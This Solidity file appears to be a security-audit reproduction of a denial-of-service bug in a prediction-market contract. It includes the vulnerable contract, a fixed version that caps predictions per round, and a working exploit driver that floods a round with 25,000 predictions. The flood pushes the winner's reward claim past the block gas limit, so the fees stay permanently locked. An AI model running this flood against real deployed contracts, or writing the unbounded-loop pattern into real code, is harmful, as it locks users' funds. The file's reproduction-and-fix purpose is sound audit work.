// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of MCP finding 62470:
// "claimReward() can DOS by iterating predictions blocking funds".
//
// predict() lets anyone push an UNBOUNDED number of Prediction structs into
// predictions[marketId][roundId] for a flat 5-USDC fee. claimReward() copies
// that entire array into memory and loops over every element. Because the array
// is attacker-inflatable and unbounded, the loop's gas cost grows without limit
// and eventually exceeds the block gas limit — so claimReward() can no longer be
// mined in any block. The winner can NEVER claim, and every 5-USDC prediction
// fee is permanently locked in the contract.
//
// predict() and claimReward() are inlined VERBATIM from the finding
// (imports/pragma stripped). The truncated `///code...` tail of claimReward is
// completed with the standard pro-rata payout so the harm can be asserted.
// The surrounding market/round scaffolding is a minimal faithful harness
// (clearly labelled) — it does not alter the vulnerable code path.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 interface used by the verbatim source.
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

/// @dev Minimal faithful ERC20 double for the opaque prediction-fee token
///      (USDC, 6 decimals). The token is the only mocked boundary — it is an
///      opaque external asset, not the vulnerable contract.
contract MockUSDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/// @dev Marker token used only to record the harmed magnitude (locked fees) at
///      the SINK, so the harm is measurable as a token balance delta.
contract LockMarker {
    string public name = "Locked prediction fees";
    string public symbol = "LOCKED-USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. predict() and claimReward() are VERBATIM from the finding.
// ─────────────────────────────────────────────────────────────────────────────
contract PredictionMarket {
    // ---- data structures referenced by the verbatim functions ----
    struct Prediction {
        address user;
        bool isBullish;
        uint256 amount;
    }

    struct Round {
        uint256 startTime;
        uint256 endTime;
        bool ended;
        uint256 startPrice;
        uint256 endPrice;
    }

    struct Market {
        address token;
        bool exists;
    }

    uint256 public constant PREDICTION_FEE = 5e6; // 5 USDC (6 decimals)

    mapping(uint256 => Market) public markets;
    mapping(uint256 => uint256) public currentRoundId;
    mapping(uint256 => mapping(uint256 => Round)) public marketRounds;
    mapping(uint256 => mapping(uint256 => Prediction[])) public predictions;
    mapping(uint256 => mapping(uint256 => mapping(address => bool))) public hasClaimed;

    event PredictionMade(uint256 marketId, uint256 roundId, address user, bool isBullish, uint256 amount);

    // ---- minimal faithful harness (labelled; NOT part of the vulnerable path) ----
    // Opens a market + its active round. Mirrors a normal admin create/start.
    function openMarketRound(uint256 marketId, address token, uint256 startPrice) external {
        markets[marketId] = Market({token: token, exists: true});
        uint256 roundId = currentRoundId[marketId];
        marketRounds[marketId][roundId] = Round({
            startTime: block.timestamp,
            endTime: block.timestamp + 24 hours,
            ended: false,
            startPrice: startPrice,
            endPrice: 0
        });
    }

    // Resolves the round (normal admin resolve): sets ended + endPrice.
    function endRound(uint256 marketId, uint256 roundId, uint256 endPrice) external {
        Round storage round = marketRounds[marketId][roundId];
        round.ended = true;
        round.endPrice = endPrice;
    }

    // Faithful reconstruction of the round-active guard for predict().
    modifier roundActive(uint256 marketId) {
        uint256 roundId = currentRoundId[marketId];
        Round memory r = marketRounds[marketId][roundId];
        require(markets[marketId].exists, "No market");
        require(!r.ended, "Round ended");
        require(block.timestamp >= r.startTime, "Not started");
        require(block.timestamp < r.endTime, "Round over");
        _;
    }

    // ───────────────────────── VERBATIM (from finding) ─────────────────────────
    function predict(uint256 marketId, bool isBullish) external roundActive(marketId) {
        uint256 roundId = currentRoundId[marketId];
        Round memory round = marketRounds[marketId][roundId];

        // Predictions close 1 hour before round ends to prevent last-minute manipulation
        require(block.timestamp < round.startTime + 23 hours, "Prediction closed (last hour)");

        // Transfer 5 USDC fee from user to contract
        require(IERC20(markets[marketId].token).transferFrom(
            msg.sender,
            address(this),
            PREDICTION_FEE
        ), "Payment failed");

        // Store the prediction
        predictions[marketId][roundId].push(Prediction({ // @> unbounded push: no cap on predictions per round -> attacker-inflatable array
            user: msg.sender,
            isBullish: isBullish,
            amount: PREDICTION_FEE
        }));
        emit PredictionMade(marketId, roundId, msg.sender, isBullish, PREDICTION_FEE);
    }

    function claimReward(uint256 marketId, uint256 roundId) external {

        Round memory round = marketRounds[marketId][roundId];
        require(round.ended, "Round not ended");
        require(!hasClaimed[marketId][roundId][msg.sender], "Already claimed");

        Prediction[] memory preds = predictions[marketId][roundId];

        // Determine winning direction (bullish if end price > start price)
        bool isBullWinning = round.endPrice > round.startPrice;

        // Calculate reward pool (total - 5% fee)
        uint256 totalPool = preds.length * PREDICTION_FEE;
        uint256 fee = (totalPool * 5) / 100;
        uint256 rewardPool = totalPool - fee;

        // Calculate user's share of winning predictions
        uint256 totalWinningAmount = 0;
        uint256 userWinningAmount = 0;

        for (uint256 i = 0; i < preds.length; i++) { // @> unbounded loop over attacker-inflatable predictions array exceeds block gas limit -> claim permanently DoS'd
            if (preds[i].isBullish == isBullWinning) {
                totalWinningAmount += preds[i].amount;
                if (preds[i].user == msg.sender) {
                    userWinningAmount += preds[i].amount;
                }
            }
        }

        // ---- faithful reconstruction of the truncated `///code...` payout tail ----
        require(userWinningAmount > 0, "No winnings");
        uint256 reward = (rewardPool * userWinningAmount) / totalWinningAmount;
        hasClaimed[marketId][roundId][msg.sender] = true;
        require(IERC20(markets[marketId].token).transfer(msg.sender, reward), "Payout failed");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: predict() enforces a maximum number of predictions per round
// (the finding's recommendation). The bounded array keeps claimReward()'s loop
// under the block gas limit, so the winner can always claim.
// ─────────────────────────────────────────────────────────────────────────────
contract PredictionMarketFixed {
    struct Prediction {
        address user;
        bool isBullish;
        uint256 amount;
    }

    struct Round {
        uint256 startTime;
        uint256 endTime;
        bool ended;
        uint256 startPrice;
        uint256 endPrice;
    }

    struct Market {
        address token;
        bool exists;
    }

    uint256 public constant PREDICTION_FEE = 5e6;
    uint256 public constant MAX_PREDICTIONS = 500; // FIX: hard cap per round

    mapping(uint256 => Market) public markets;
    mapping(uint256 => uint256) public currentRoundId;
    mapping(uint256 => mapping(uint256 => Round)) public marketRounds;
    mapping(uint256 => mapping(uint256 => Prediction[])) public predictions;
    mapping(uint256 => mapping(uint256 => mapping(address => bool))) public hasClaimed;

    event PredictionMade(uint256 marketId, uint256 roundId, address user, bool isBullish, uint256 amount);

    function openMarketRound(uint256 marketId, address token, uint256 startPrice) external {
        markets[marketId] = Market({token: token, exists: true});
        uint256 roundId = currentRoundId[marketId];
        marketRounds[marketId][roundId] = Round({
            startTime: block.timestamp,
            endTime: block.timestamp + 24 hours,
            ended: false,
            startPrice: startPrice,
            endPrice: 0
        });
    }

    function endRound(uint256 marketId, uint256 roundId, uint256 endPrice) external {
        Round storage round = marketRounds[marketId][roundId];
        round.ended = true;
        round.endPrice = endPrice;
    }

    modifier roundActive(uint256 marketId) {
        uint256 roundId = currentRoundId[marketId];
        Round memory r = marketRounds[marketId][roundId];
        require(markets[marketId].exists, "No market");
        require(!r.ended, "Round ended");
        require(block.timestamp >= r.startTime, "Not started");
        require(block.timestamp < r.endTime, "Round over");
        _;
    }

    function predict(uint256 marketId, bool isBullish) external roundActive(marketId) {
        uint256 roundId = currentRoundId[marketId];
        Round memory round = marketRounds[marketId][roundId];

        require(block.timestamp < round.startTime + 23 hours, "Prediction closed (last hour)");
        // FIX: bound the array so the claim loop can never exceed the block gas limit.
        require(predictions[marketId][roundId].length < MAX_PREDICTIONS, "Round is full");

        require(IERC20(markets[marketId].token).transferFrom(
            msg.sender,
            address(this),
            PREDICTION_FEE
        ), "Payment failed");

        predictions[marketId][roundId].push(Prediction({
            user: msg.sender,
            isBullish: isBullish,
            amount: PREDICTION_FEE
        }));
        emit PredictionMade(marketId, roundId, msg.sender, isBullish, PREDICTION_FEE);
    }

    function claimReward(uint256 marketId, uint256 roundId) external {
        Round memory round = marketRounds[marketId][roundId];
        require(round.ended, "Round not ended");
        require(!hasClaimed[marketId][roundId][msg.sender], "Already claimed");

        Prediction[] memory preds = predictions[marketId][roundId];

        bool isBullWinning = round.endPrice > round.startPrice;

        uint256 totalPool = preds.length * PREDICTION_FEE;
        uint256 fee = (totalPool * 5) / 100;
        uint256 rewardPool = totalPool - fee;

        uint256 totalWinningAmount = 0;
        uint256 userWinningAmount = 0;

        for (uint256 i = 0; i < preds.length; i++) {
            if (preds[i].isBullish == isBullWinning) {
                totalWinningAmount += preds[i].amount;
                if (preds[i].user == msg.sender) {
                    userWinningAmount += preds[i].amount;
                }
            }
        }

        require(userWinningAmount > 0, "No winnings");
        uint256 reward = (rewardPool * userWinningAmount) / totalWinningAmount;
        hasClaimed[marketId][roundId][msg.sender] = true;
        require(IERC20(markets[marketId].token).transfer(msg.sender, reward), "Payout failed");
    }
}

/// @dev Minimal actor. predict() records msg.sender, so distinct Trader
///      instances give distinct on-chain predictors (victim vs. attacker).
///      It only forwards calls — it does not alter the vulnerable path.
contract Trader {
    function approveMax(MockUSDC usdc, address market) external {
        usdc.approve(market, type(uint256).max);
    }

    function predictOnce(PredictionMarket market, uint256 marketId, bool isBullish) external {
        market.predict(marketId, isBullish);
    }

    function floodPredict(PredictionMarket market, uint256 marketId, bool isBullish, uint256 n) external {
        for (uint256 i = 0; i < n; i++) {
            market.predict(marketId, isBullish);
        }
    }

    // Claim with a realistic block-gas-limit cap; returns false if it OOG-reverts.
    function cappedClaim(PredictionMarket market, uint256 marketId, uint256 roundId, uint256 gasCap)
        external
        returns (bool ok)
    {
        (ok, ) = address(market).call{gas: gasCap}(
            abi.encodeWithSelector(PredictionMarket.claimReward.selector, marketId, roundId)
        );
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver.
//   run()        -> reproduces the DoS / fund-lock on the VULNERABLE contract.
//   runControl() -> negative control: a small (non-inflated) round claims fine.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant FEE = 5e6; // 5 USDC

    // A realistic mainnet block gas limit. claimReward() must fit under this to
    // ever be mined; the inflated round does not, so the winner can never claim.
    uint256 internal constant BLOCK_GAS_LIMIT = 30_000_000;

    // Number of predictions the attacker floods the round with. Chosen so the
    // claim loop's gas (~42M here) exceeds BLOCK_GAS_LIMIT (calibrated: the loop
    // costs ~0.031*N^2 + 897*N gas, crossing 30M near N=20000).
    uint256 internal constant FLOOD = 25_000;

    uint256 internal constant MARKET_ID = 1;
    uint256 internal constant ROUND_ID = 0;

    // Exposed results (DoS run).
    address public marketAddr;
    address public usdcAddr;
    address public markerAddr;
    address public winner;

    uint256 public lockedFees;         // USDC locked in the contract (harm magnitude)
    uint256 public winnerBalanceAfter; // winner USDC after the failed claim (== 0)
    bool public claimReverted;         // capped claim OOG-reverted
    uint256 public sinkMarkerBalance;

    // Exposed results (negative control, small round).
    uint256 public controlWinnerPayout;
    bool public controlClaimSucceeded;

    function run() external payable {
        MockUSDC usdc = new MockUSDC();                   // nonce 1
        PredictionMarket market = new PredictionMarket(); // nonce 2
        LockMarker marker = new LockMarker();             // nonce 3
        Trader victim = new Trader();                     // nonce 4
        Trader attacker = new Trader();                   // nonce 5

        marketAddr = address(market);
        usdcAddr = address(usdc);
        markerAddr = address(marker);
        winner = address(victim);

        // --- open the market + active round (admin) ---
        market.openMarketRound(MARKET_ID, address(usdc), 100);

        // --- victim makes ONE genuine bullish prediction (the eventual winner) ---
        usdc.mint(address(victim), FEE);
        victim.approveMax(usdc, address(market));
        victim.predictOnce(market, MARKET_ID, true);

        // --- attacker floods the round with FLOOD cheap predictions ---
        usdc.mint(address(attacker), FLOOD * FEE);
        attacker.approveMax(usdc, address(market));
        attacker.floodPredict(market, MARKET_ID, true, FLOOD);

        // --- round resolves bullish (endPrice > startPrice): victim's side wins ---
        market.endRound(MARKET_ID, ROUND_ID, 200);

        // pool locked in the contract == every 5-USDC fee ever paid in
        lockedFees = usdc.balanceOf(address(market));

        // --- winner tries to claim under a realistic block gas limit -> OOG revert ---
        bool ok = victim.cappedClaim(market, MARKET_ID, ROUND_ID, BLOCK_GAS_LIMIT);
        claimReverted = !ok;
        winnerBalanceAfter = usdc.balanceOf(address(victim));

        // HARM: the claim is un-mineable, the winner gets nothing, and the entire
        // fee pool is permanently locked in the contract.
        require(claimReverted, "expected OOG revert on inflated claim");
        require(winnerBalanceAfter == 0, "winner unexpectedly paid");
        require(lockedFees == (FLOOD + 1) * FEE, "fee pool accounting");
        require(usdc.balanceOf(address(market)) == lockedFees, "fees not locked");

        // record the locked magnitude at the SINK as the measured harm
        marker.mint(SINK, lockedFees);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }

    // Negative control: an identical but SMALL round claims successfully and pays
    // the winner — proving the harm is caused by the unbounded array size, not by
    // any logic defect in claimReward().
    function runControl() external {
        MockUSDC usdc = new MockUSDC();
        PredictionMarket market = new PredictionMarket();
        Trader victim = new Trader();
        Trader attacker = new Trader();

        market.openMarketRound(MARKET_ID, address(usdc), 100);

        uint256 small = 10;
        usdc.mint(address(victim), FEE);
        victim.approveMax(usdc, address(market));
        victim.predictOnce(market, MARKET_ID, true);

        usdc.mint(address(attacker), small * FEE);
        attacker.approveMax(usdc, address(market));
        attacker.floodPredict(market, MARKET_ID, true, small);

        market.endRound(MARKET_ID, ROUND_ID, 200);

        bool ok = victim.cappedClaim(market, MARKET_ID, ROUND_ID, BLOCK_GAS_LIMIT);
        controlClaimSucceeded = ok;
        controlWinnerPayout = usdc.balanceOf(address(victim));
    }
}
